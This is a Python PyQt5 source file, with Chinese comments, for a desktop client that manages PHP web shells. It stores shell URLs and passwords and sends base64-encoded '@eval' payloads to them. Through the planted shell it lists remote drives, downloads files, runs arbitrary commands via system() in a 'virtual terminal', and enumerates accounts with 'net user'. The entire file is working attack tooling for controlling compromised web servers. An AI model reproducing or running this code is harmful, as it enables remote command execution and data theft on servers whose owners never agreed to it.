
'''
1.程序必须写大部分注释，一些基本语法除外
2.命标准，eg:shu_ru_kuang or button

'''

import base64
import urllib.request
import urllib.parse

from PyQt5.QtWidgets import QTreeWidgetItem
from PyQt5.uic.properties import QtWidgets

from PyQt5.uic import loadUi  # 需要导入的模块

from PyQt5.QtWidgets import QApplication, QMainWindow, QMessageBox, QDialog, QWidget, QMenu, QFileDialog
from PyQt5 import QtWidgets, QtCore, QtGui

import sys

class Ui_form(QWidget):
    def __init__(self):
        super().__init__()
        loadUi("Wchild.ui", self)  # 加载UI文件

class php7(QMainWindow):
    def __init__(self):
        super().__init__()
        #self.resize(300, 300)
        loadUi("first.ui", self)  # 加载UI文件

        self.wen_jian_guan_li_widget.hide() #隐藏所有内嵌窗口
        self.listWidget.hide()
        #self.bei_jing_label.hide()
        self.cmd_widget.hide()
        #self.cmd_textEdit.hide()
        #self.cmd_lineEdit.hide()

        self.wen_jian_guan_li_action.triggered.connect(self.show_wen_jian_guan_li)
        self.shell_guan_li_action.triggered.connect(self.show_shell_guan_li)
        self.cmd_action.triggered.connect(self.show_cmd)
        self.cha_xun_users_action.triggered.connect(self.User)

        self.listWidget.installEventFilter(self)  # 初始化QListView控件焦点事件
        self.treeWidget_2.installEventFilter(self)  # 初始化treeWidget_2控件焦点事件

        self.treeWidget.doubleClicked.connect(self.displayfile)  # teeweight双击

        #虚拟终端部分
        self.Virtualshell()
        self.zhi_xing_pushButton.clicked.connect(self.shellcommand)
        self.clear_pushButton.clicked.connect(self.clearVirtual)

        self.gif = QtGui.QMovie('3.gif')
        self.bei_jing_label.setMovie(self.gif)
        self.gif.start()

        self.setIcon()  #调用图标设置函数

        #self.eventFilter(GetForegroundWindow())

        #self.pushButton.clicked.connect(self.GetLine)   #调用UI文件中的控件
        #self.pushButton.clicked.connect(self.Connect_shell)

    '''背景图和logo添加函数'''
    def setIcon(self):
        '''palette1 = QtGui.QPalette()
        pix = QtGui.QPixmap("./3.gif")

        pix = pix.scaled(self.width(),self.height())

        # palette1.setColor(self.backgroundRole(), QColor(192,253,123))   # 设置背景颜色
        palette1.setBrush(self.backgroundRole(), QtGui.QBrush(pix))  # 设置背景图片
        self.setPalette(palette1)
        # self.setAutoFillBackground(True) # 不设置也可以

        # self.setGeometry(300, 300, 250, 150)'''
        self.setWindowIcon(QtGui.QIcon('logo.png'))


    '''重写焦点响应事件来创建不同的右键菜单'''
    def eventFilter(self, widget, event):  # 重写焦点响应事件
        if widget != None:
            # print(currentitem)
            if widget.inherits("QListWidget"):  # 创建添加shell菜单
                self.createContextMenu()

            elif widget.inherits("QTreeWidget"):  # 创建文件菜单
                self.fileContextMenu()
            else:
                pass
            return False

    '''shell管理部分'''

    def show_shell_guan_li(self):#点击shell管理后展示shell管理内嵌窗口
        self.wen_jian_guan_li_widget.hide()
        self.cmd_widget.hide()
        self.bei_jing_label.hide()
        # self.cmd_textEdit.hide()
        # self.cmd_lineEdit.hide()
        self.listWidget.show()

    def createContextMenu(self):
        # 创建右键菜单
        # 必须将ContextMenuPolicy设置为Qt.CustomContextMenu
        # 否则无法使用customContextMenuRequested信号

        self.listWidget.setContextMenuPolicy(QtCore.Qt.CustomContextMenu)
        self.listWidget.customContextMenuRequested.connect(self.showContextMenu)
        # 创建QMenu
        self.contextMenu = QtWidgets.QMenu(self)
        self.connect_shell_button = self.contextMenu.addAction(u'连接')
        self.add_shell_button = self.contextMenu.addAction(u'添加')
        self.modify_shell_button = self.contextMenu.addAction(u'编辑')
        self.delete_shell_button = self.contextMenu.addAction(u'删除')
        self.delete_all_shell_button = self.contextMenu.addAction(u'清空')

        # 将动作与处理函数相关联，
        # 将他们分别与不同函数关联，实现不同的功能
        self.connect_shell_button.triggered.connect(self.Connect_shell)
        self.add_shell_button.triggered.connect(self.Add_shell_show)
        #self.modify_shell_button.triggered.connect(self.Modify_shell)
        self.delete_shell_button.triggered.connect(self.Delete_shell)
        #self.delete_all_shell_button.triggered.connect(self.Delete_all_shell)

    def showContextMenu(self, pos):  # 右键点击时调用的函数
        # 菜单显示前，将它移动到鼠标点击的位置
        self.contextMenu.move(QtGui.QCursor.pos())
        self.contextMenu.show()

    '''添加shell'''
    def Add_shell_show(self):
        self.WChild = Ui_form()
        #print(2)
        self.WChild.show()
        #print(3)
        self.WChild.pushButton.clicked.connect(self.GetLine)  # 子窗体确定添加shell

    def GetLine(self):  # 添加shell给listweiget传值
        #print(4)
        url = self.WChild.lineEdit.text()
        #print(5)
        #url = input("请输入地址：")
        passwd = self.WChild.lineEdit_2.text()
        #passwd = input("请输入密码：")
        if (url == "" or passwd == ""):  # 判断地址或者密码是不是空

            box = QtWidgets.QMessageBox()
            box.information(self, "提示", "地址或密码不能为空！")
            #print("地址或密码不能为空！！！")
        else:
            data = url + "  " + passwd  # 得到添加shell的内容并组合
            self.listWidget.addItem(data)  # 添加内容
            self.WChild.close()
            #print(6)

    '''链接shell'''
    def Connect_shell(self):
        try:
            #shell = self.Ui.listWidget.currentItem().text()
            shell = self.listWidget.currentItem().text()
            #shell = di_zhi
            # 返回选择行的数据

            shell2 = shell.split("  ")  #

            phpcode = "echo(hello);"
            phpcode = base64.b64encode(phpcode.encode('GB2312'))

            data = {shell2[1]: '@eval(base64_decode($_POST[z0]));',
                    'z0': phpcode}

            returndata = self.filedir(shell2, data)

            if returndata != "":
                box = QtWidgets.QMessageBox()
                box.information(self, "提示", "连接成功！")
                print("连接成功1")
                self.shelllabel.setText(shell)
                # self.File_update()  #显示目录
                # self.Virtualshell()

            else:
                box = QtWidgets.QMessageBox()
                box.information(self, "提示", "连接失败！")
                print("连接失败")
        except:
            box = QtWidgets.QMessageBox()
            box.information(self, "提示", "连接失败！")
            print("连接失败")
    '''删除shell'''
    def Delete_shell(self):
        button = QMessageBox.question(self, "警告！",
                                      self.tr("你确定要删除选中的项吗？"),
                                      QMessageBox.Ok | QMessageBox.Cancel,
                                      QMessageBox.Ok)
        if button == QMessageBox.Ok:
            shell = self.listWidget.currentRow()  # 获取选择项的行号
            # shell = self.Ui.listWidget.currentItem().text()  # 返回选择行的数据
            #shell2 = self.listWidget.currentItem().text()
            self.listWidget.takeItem(shell)  # 删除listwidget中的数据
        else:
            return

    '''文件管理部分'''
    def show_wen_jian_guan_li(self):#点击文件管理后展示文件管理内嵌窗口
        self.listWidget.hide()
        self.cmd_widget.hide()
        self.bei_jing_label.hide()
        #self.cmd_textEdit.hide()
        #self.cmd_lineEdit.hide()
        self.wen_jian_guan_li_widget.show()

    def fileContextMenu(self):
        '''
        创建右键菜单
        '''
        # 必须将ContextMenuPolicy设置为Qt.CustomContextMenu
        # 否则无法使用customContextMenuRequested信号
        self.treeWidget_2.setContextMenuPolicy(QtCore.Qt.CustomContextMenu)
        self.treeWidget_2.customContextMenuRequested.connect(self.showContextMenu)

        # 创建QMenu
        self.contextMenu = QtWidgets.QMenu(self)
        self.file_update = self.contextMenu.addAction(u'更新')
        self.file_upload = self.contextMenu.addAction(u'上传')
        self.file_download = self.contextMenu.addAction(u'下载')
        self.file_delete = self.contextMenu.addAction(u'删除')
        self.file_rename = self.contextMenu.addAction(u'重命名')

        # 将动作与处理函数相关联
        # 这里为了简单，将所有action与同一个处理函数相关联，
        # 当然也可以将他们分别与不同函数关联，实现不同的功能
        self.file_update.triggered.connect(self.File_update)
        #self.file_upload.triggered.connect(self.File_upload)
        self.file_download.triggered.connect(self.File_download)
        #self.file_delete.triggered.connect(self.File_delete)
        #self.file_rename.triggered.connect(self.renameshow)

    '''右键菜单移动到鼠标的位置'''
    def showContextMenu(self, pos):  # 右键点击时调用的函数
        # 菜单显示前，将它移动到鼠标点击的位置
        self.contextMenu.move(QtGui.QCursor.pos())
        self.contextMenu.show()

    def filedir(self, shell, phpcode):  # 发送php请求
        # 请求头
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.84 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded"
            # 以表单的形式请求
        }

        postData = urllib.parse.urlencode(phpcode).encode("utf-8", "ignore")
        #print(postData)
        req = urllib.request.Request(shell[0], postData, headers)
        # 发起请求`
        response = urllib.request.urlopen(req)
        #print(response)
        # data = (response.read()).deco de('utf-8')
        return response.read()

    '''更新'''
    def File_update(self):
        shell = self.shelllabel.text()
        #shell = "http://127.0.0.1/word/hello.php  1"
        if shell!="":
            #列出目录
            self.treeWidget.clear() #清空treeweight的所有内容

            self.treeWidget_2.clear() #清空treeweight_2的所有内容'''

            path=["C:","D:","E:","F:","G:","H:"]   #列出3个盘
            #print(path)
            for i in path:  #循环列出c盘  D盘
                data=self.listfile(i)   #调用列出目录
                data = data.decode('GB2312',"ignore")
                #print(data)
                if data =='ERROR:// Path Not Found Or No Permission!':
                    #判断3个盘是不是存在
                    pass
                else:  #若存在 列出目录
                    listdata = data.split('  ')   # 分割data
                    root = QTreeWidgetItem(self.treeWidget)  #创建对象

                    #self.tree = QTreeWidget()
                    root.setText(0,i)  #创建主节点'''
                    listdata=listdata[:-1]   #去掉空格
                    for i in listdata:  #循环每一个元素
                        singerdata = i.split("\t")   #用\t将名字大小权限修改时间分割
                        #print(singerdata)
                        if singerdata[0][-1] == "/":   #判断是不是有下级目录
                            singerdata[0]=singerdata[0][:-1]   #创建c盘下的子节点

                            child1 = QTreeWidgetItem(root)   #子节点位置
                            child1.setText(0, singerdata[0])   #
                            #print(singerdata[0])
                            #print(type(singerdata[0]))

                        # else:
                        #     child2 = QTreeWidgetItem(child1)  # 创子子节点
                        #     child2.setText(0, singerdata[0])  # 赋值

                        #phpcode = "system('" + "dir" + "');"
        else:
            box = QtWidgets.QMessageBox()
            box.information(self, "提示", "请先连接shell！")
            print("请先链接shell")

    '''双击显示详细信息'''

    def displayfile(self):
        try:
            index = self.treeWidget.currentItem()  # 当前的Item对象
            # print(filepath)  #输出当前项的绝对目录

            data = self.listfile(self.showfilepath())  # 调用函数显示数据
            print(data)
            data = data.decode('GB2312')
            print(data)
            listdata = data.split('  ')  # 将文件分开
            #print(listdata)

            listdata = listdata[:-1]  # 去掉最后的空
            #print(listdata)

            self.treeWidget_2.clear()  # 清空treeweight_2中的所有数据
            #print(11)
            for i in listdata:  # 循环每一个元素
                singerdata = i.split('\t')  # 用\t将名字大小权限修改时间分割
                #print(singerdata[0])

                if singerdata[0] != "./" and singerdata[0] != "../" and singerdata[0][-1] == "/":
                    child2 = QTreeWidgetItem(index)  # 创建子子节点
                    child2.setText(0, singerdata[0][:-1])
                    # 将文件详细信息写入到listweight_2
                if singerdata[0] != "./" and singerdata[0] != "../" and singerdata[0][-1] != "/":  # 文件显示出来,不显示文件夹！！！
                    if singerdata[0][-1] == "/":  # 去掉文件夹后面的斜杠
                        singerdata[0] = singerdata[0][:-1]
                    try:
                        singerdata[2] = self.Transformation(abs(int(singerdata[2])))  # 尝试单位转换
                    except:
                        pass
                    #print(singerdata)
                    root = QTreeWidgetItem(self.treeWidget_2)  # 创建对象
                    # 显示数据
                    root.setText(0, singerdata[0])
                    root.setText(1, singerdata[1])
                    root.setText(2, singerdata[3])
                    root.setText(3, singerdata[2])
        except:
            pass

    '''#显示当前对象的路径'''
    def showfilepath(self):
        # filename = self.Ui.treeWidget.currentItem().text(0)  #当前目录或文件名
        #print(12)
        index = self.treeWidget.currentItem()  # 当前的Item对象
        try:
            filepath = index.text(0)
            index2 = index.parent().text(0)  # 父节点
            filepath = index2 + '\\\\' + index.text(0)  # 组合
            index3 = index.parent().parent().text(0)  # 父父节点
            filepath = index3 + '\\\\' + filepath  # 组合目录
            index4 = index.parent().parent().parent().text(0)  # 父父父节点
            filepath = index4 + '\\\\' + filepath  # 组合目录
            index5 = index.parent().parent().parent().parent().text(0)  # 父父父父节点
            filepath = index5 + '\\\\' + filepath  # 组合目录
            index6 = index.parent().parent().parent().parent().parent().text(0)  # 父父父父节点
            filepath = index6 + '\\\\' + filepath  # 组合目录
        except:
            pass
        print(filepath)
        return filepath

    '''显示文件大小的时候换算文件大小'''
    def Transformation(self, size):
        if (size < 1024):
            return str(size) + " B"
        elif 1024 < size < 1048576:
            size = round(size / 1024, 2)
            return str(size) + " KB"
        elif 1048576 < size < 1073741824:
            size = round(size / 1048576, 2)
            return str(size) + " MB"
        elif size > 107374824:
            size = round(size / 1073741824, 2)
            return str(size) + " GB"
        else:
            pas

    def listfile(self,path):  # 列出目录
        #path = "C:"
        shell = self.shelllabel.text()  # 获取shell
        #shell = "http://127.0.0.1/word/hello.php  1"
        # print(shell)
        shell = shell.split("  ")
        phpcode = '$D="' + path + '";$F=@opendir($D);if($F==NULL){echo("ERROR:// Path Not Found Or No Permission!");}else{$M = NULL;$L = NULL;while($N= @readdir($F)){$P =$D."/".$N;$T=@date("Y-m-d H:i:s",@filemtime($P));@$E=substr(base_convert( @fileperms($P), 10, 8), -4);$R = "\t".$T."\t". @filesize($P)."\t".$E."  ";if(@ is_dir($P)){$M.=$N."/".$R;}else{$L.=$N.$R;}}echo($M.$L);@closedir($F);};die();'
        # print(phpcode)
        data = {shell[1]: phpcode}
        #print(data)
        #print(self.filedir(shell,data))
        return self.filedir(shell,data)  # 返回数据

    # sendcode函数是用来给发送的数据base64加密的函数
    def sendcode(self, phpcode):
        shell = self.shelllabel.text()  # 获取shell
        #shell = "http://127.0.0.1/word/hello.php  1"
        if shell != "":
            shell = shell.split("  ")

            phpcode = base64.b64encode(phpcode.encode('GB2312'))
            #print(phpcode)
            data = {shell[1]: '@eval(base64_decode($_POST[z0]));',
                    'z0': phpcode}

            return self.filedir(shell, data)
        else:
            box = QtWidgets.QMessageBox()
            box.information(self, "提示", "请先连接shell！")
            #print("请先连接shell!")

    '''文件下载'''
    def File_download(self):
        shell = self.shelllabel.text()  # 获取shell
        if shell != "":  # 判断是否连接shell
            try:
                path = self.showfilepath()  # 获取文件的路径
                filepath = self.treeWidget_2.currentItem().text(0)  # 获取文件名
                compath = path + "\\\\" + filepath  # 组合路径
                phpcode = '$F = "' + compath + '";$fp=@fopen($F,"rb") or die("Unable to open file!") ;echo @fread($fp,filesize($F));@fclose($fp);die();'
                # print(filepath)
                # print(compath)
                # print(phpcode)
                returndata = self.sendcode(phpcode)  # 尝试下载文件
                # print(returndata)
                # 写入文件
                #print(returndata)
                if returndata != "" and returndata != "Unable to open file!":

                    savefilepath = self.filesave(filepath)

                    #print(filepath)
                    #print(savefilepath)
                    f = open(savefilepath, "wb")  # 打开文件
                    f.write(returndata)  # 写入文件
                    f.close()  # 关闭文件
                    box = QtWidgets.QMessageBox()
                    box.information(self, "提示", "下载成功！")
                else:
                    box = QtWidgets.QMessageBox()
                    box.information(self, "提示", "下载失败！")
            except:
                box = QtWidgets.QMessageBox()
                box.information(self, "提示", "下载失败！")
        else:
            box = QtWidgets.QMessageBox()
            box.information(self, "提示", "请先连接shell！")

    '''文件保存对话框'''

    def filesave(self, filename):
        #print(filename)
        fileName, filetype = QFileDialog.getSaveFileName(self, (r"保存文件"), (r'G:\\' + filename), r"All files(*.*)")
        #print(1)
        # print(fileName)
        return fileName

    '''虚拟终端'''

    def show_cmd(self):#点击虚拟终端后展示虚拟终端内嵌窗口
        self.wen_jian_guan_li_widget.hide()
        self.listWidget.hide()
        self.bei_jing_label.hide()
        self.cmd_widget.show()
        #self.cmd_textEdit.show()
        #self.cmd_lineEdit.show()

    def Virtualshell(self):
        self.cmd_textEdit.setReadOnly(True)  # 设置textEdit不可编辑
        self.cmd_textEdit.setText(r"C:\Users\admin> ")
    #虚拟终端执行按钮
    def shellcommand(self):
        self.cmd_textEdit.clear()
        shellcommand = self.cmd_lineEdit.text()
        #shellcommand = input()
        #print(shellcommand)
        #print(shell)
        phpcode ="system('" + shellcommand + "');"
        #print(phpcode)
        returncommand = self.sendcode(phpcode)
        #print(type(returncommand))
        #print(returncommand)
        #print(str(returncommand, 'GB2312'))
        self.cmd_textEdit.setText(str(returncommand, 'GB2312'))
    #清空按钮
    def clearVirtual(self):
        self.cmd_lineEdit.clear()
        self.cmd_textEdit.clear()

    '''快捷功能部分'''

    def User(self):
        user = ""
        phpcode = 'system("net user");'
        print(phpcode)
        data = self.sendcode(phpcode)
        print(data)
        # print(data[113:-20])
        if data != None:
            data = data[113:-20].replace('\r\n', '').split(" ")
            print(data)
            for i in data:
                if i != "":
                    user += "用户：" + i + "\n"
            # print(user)
            box = QtWidgets.QMessageBox()
            box.about(self, "查询用户", user[:-1])
        else:
            pass

if __name__ == '__main__':
    print("hello")
    '''a = php7()  #创建一个对象
    a.GetLine()
    a.Connect_shell()   #链接一句话
    #a.File_update()     #获取目录
    #a.shellcommand()   #命令执行虚拟终端'''
    app = QApplication(sys.argv)
    a = php7()

    a.show()
    #app.installEventFilter(a)
    #a.createContextMenu()
    #a.fileContextMenu()

    sys.exit(app.exec_())
